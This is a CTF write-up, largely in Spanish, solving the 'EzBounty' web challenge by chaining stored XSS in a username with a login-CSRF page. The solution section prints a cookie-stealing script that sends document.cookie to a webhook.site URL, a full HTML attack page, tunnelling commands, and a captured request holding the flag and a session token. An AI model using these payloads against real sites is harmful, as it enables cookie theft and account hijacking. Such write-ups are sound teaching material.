# k1nd4sus 2026

# EzBounty

## Web: XSS, CSRF

## Description
I found a bug on this platform and reported it on HackerOne but they told me it was out of scope. Could you help me get my money?

Note: This challenge is solvable only with Chromium-based browsers. It is recommended to test your payloads on Chrome.

https://chall.k1nd4sus.it:30510


## Files
> This challenge provide de src code of the web aplication

---

## Analysis
Es una web muy simple tanto que no necesito tomarle fotos inicias sesion y solo te recibe una pantalla puedes ponerf cualquier username y aca esta el truco por ejemplo si pones el username:

```paylod_de_prueba
<script>alert(1)</script>
```
y en efecto escapa y es vulnerable a XSS, bien tiene un boton de reportar url esto hace que entre a cualquier URL sin sanitizar y si le enviamos el paylod que recoja cookies no va funcionar por que en **/report** literal visita la pagina y pide paginas de tu script y el **SOP** no va dejar enviarlas.

Y vemos que setea una cookie aparte osea en el mismo dominio le dicec al navegador toma esta cookie ademas de mi cookie de sesion lo podemos ver por el codigo que nos pasaron:

```PYTHON
# Primero el bot inicia sesión como ADMIN...
await page.goto(f"{BASE_URL}/login")
await page.type('input[name="username"]', ADMIN_USER)
await page.type('input[name="password"]', ADMIN_PASS)
await page.click('button[type="submit"]')

await asyncio.sleep(2)

# ¡AQUÍ ESTÁ LA MAGIA!
await page.setCookie({
    "name": "flag",
    "value": FLAG,  
    "httpOnly": False,
    "sameSite": "None",
    "secure": True
})
```
## Theory (corrigue esto IA los temas)

To solve this challenge, you need to understand:

- **XSS (Cross-Site Scripting)**: Understanding reflected XSS vulnerabilities and how user input is reflected in the HTML output without proper sanitization.
- **JavaScript**: Knowledge of JavaScript execution contexts, event handlers, and the DOM.
- **Blacklist Bypass**: Techniques to evade keyword filters using character escaping, encoding, or alternative syntax.
- **CSP (Content Security Policy) Bypass**: Understanding how CSP restricts script execution and finding ways to work within or around these restrictions.
- **SOP (Same-Origin Policy)**: Understanding browser security policies and how to work with them.
- **Data URIs**: Using data URIs to embed inline code and bypass external resource restrictions.
- **CSRF**: Using encoding to obfuscate payloads and bypass filters.
- **Patience**: The ability to systematically test and iterate on solutions :)

---

## Solution

### Step 1: 

Una vez sabiendo esto lo que sigue es crear un usuario que sea largo y tenga la capacidad de sacar las cookies entonces un user que es el coigo js y su contra:

```user
<script>fetch('https://webhook.site/weeb_hook_id?cookie=' + document.cookie)</script>
```

```pass
algo
```

Bien al entrar a la cuenta en **/dashboard** podemos ver que en efecto el codigo js funciona pudo escapar y ademas nos llego a nuestro webhook y robo la cookie.

### Step2:

Bien si se lo pasamos asi al admin entrara a su cuenta no ara nada logico por que no hay codigo que ejecutar ahi  asi que no funciona asi que tenemos que hacer uso de **CSRF** y consiste en rediriguir entonces la estrategia es muy simple:

```
ARCHIVO_MALICIOSO -> LOGOUT CUENTA ADMIN -> LOGIN CUENTA MALICIOSA -> XSS EJECUTADO
```

Asi que si le doy mis credenciales y se loguea con mi cuanta con **CSRF** lo rediriguimos ahi y con XSS robamos cookies y flag, yo hice mi paylod asi:

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    
    <img src="https://chall.k1nd4sus.it:30510/logout" style="display:none;" onload="mandarLogin()" onerror="mandarLogin()">

    <form id="formulario-robo" action="https://chall.k1nd4sus.it:30510/login" method="POST">
        <input type="hidden" name="username" id="cuenta-bomba" value="">
        <input type="hidden" name="password" value="algo">
    </form>

    <script>
        function mandarLogin() {
            // Ponemos el payload de la cuenta bomba
            document.getElementById("cuenta-bomba").value = "<script>fetch('https://webhook.site/weebhook_id?cookie=' + document.cookie)<\/script>";
            
            // Forzamos el envío del formulario usando el SameSite=None
            document.getElementById("formulario-robo").submit();
        }
    </script>
</body>
</html>
```

En pocas palabras en ves de un window.location lo hace con la imagen invisible y lo loguea esto es posible ya que el **SOP** deja mandar y hacer pero no recibir, bien una vez logueado ejecuta el codigo js que tenia el user y listo nos manda la flag.

una vez tenemos el archivo tenemos que hosteralo en un server eso es sencillo en la misma carpeta del paylod ejecutamos un server sencillo hacia locahost:

```python
python -m http.server 8000 
```

y para sacar a la red necesitamos tunelizarlo la opcion por exelencia para paginas web o html asi que lo sacamos por ssh con este comando apuntado al puerto que pusimos:

```bash
ssh -R 80:localhost:8000 localhost.run
```

Este me da una url que apunta al directorio donde tengo estos paylods:

```
https://5fd4579004cbb7.lhr.life
```

Asi que lo unico que queda es rediriguirlo a mi url y esperar a que se loegue con mis credenciales y esperar a que se ejecute el codigo XSS

```
https://5fd4579004cbb7.lhr.life/XSS_PAGE.html
```
y listo recibimos la flag al weebhook

```
GET 	https://webhook.site/26ddafae-d26f-40a6-9d00-edfb731e1040?cookie=flag=KSUS{moneyless_iframe_baby};%20session=.eJwtjdEKgjAUQH9F9qJRc9PmwmH1KTF379gInbgrPUT_XlSP53DgPNmWcb1FYEZ1Sh--ONsJmWFDdmtc6OKRXKjKQLRkI8QDx5DSvc6RULQawHqLHFrtuZJW8x6k5Ah-PB0bbKSSV_fJI57LYl9ActuEM9U_txvEf8Jeb4anLZ4.aeQAqw.xNMxNzjD5udQup-kJ8JM39CwsSQ
Host 	81.56.204.152 Whois Shodan Netify Censys VirusTotal
Location 	🇮🇹 Milan, Lombardia, Italy
Date 	04/18/2026 4:07:39 PM (27 minutes ago)
Size 	0 bytes
Time 	0.001 sec
ID 	4b90916b-d96b-4a1a-810c-a5538f88b18b
Note 	Add Note
```

**MACHINE PWNED!** :)

---

## Flag
> **KSUS{moneyless_iframe_baby}**

---

## How to avoid

Esto te toca a ti IA se breve
---

> **Author:** Jose Antonio Villafaña Montes de Oca
